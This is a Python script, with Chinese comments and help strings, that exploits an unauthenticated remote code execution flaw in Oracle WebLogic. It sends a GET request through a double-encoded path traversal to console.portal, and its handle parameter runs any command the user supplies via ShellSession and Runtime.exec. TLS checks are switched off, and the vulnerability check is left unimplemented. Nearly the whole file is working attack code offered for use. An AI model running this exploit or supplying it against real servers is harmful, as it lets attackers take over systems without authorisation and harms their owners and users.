import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

class Vulnerability:
    def __init__(self, target, command):
        self.target = target
        self.command = command
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        self.session = requests.session()
        self.headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}

    def check(self):
        """
        在这里执行检查任务
        """
        raise NotImplementedError

    def exploit(self):
        """
        在这里执行利用任务
        """
        print("[+] 发送 GET 请求....")

        exploit_url = self.target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + self.command + "');\");"

        response = self.session.get(exploit_url, verify=False, headers=self.headers)

        print("[+] 完成!!")


def parse_arguments():
    parser = argparse.ArgumentParser(description="WebLogic 无需认证即可通过 GET 请求进行 RCE")
    parser.add_argument("target", help="目标的URL或IP地址")
    parser.add_argument("command", help="要执行的命令")
    parser.add_argument("-c", "--check", action="store_true", help="仅进行漏洞检查")
    parser.add_argument("-e", "--exploit", action="store_true", help="执行漏洞利用")
    return parser.parse_args()


def main():
    args = parse_arguments()
    vuln = Vulnerability(args.target, args.command)

    if args.check:
        vuln.check()

    if args.exploit:
        vuln.exploit()


if __name__ == "__main__":
    main()
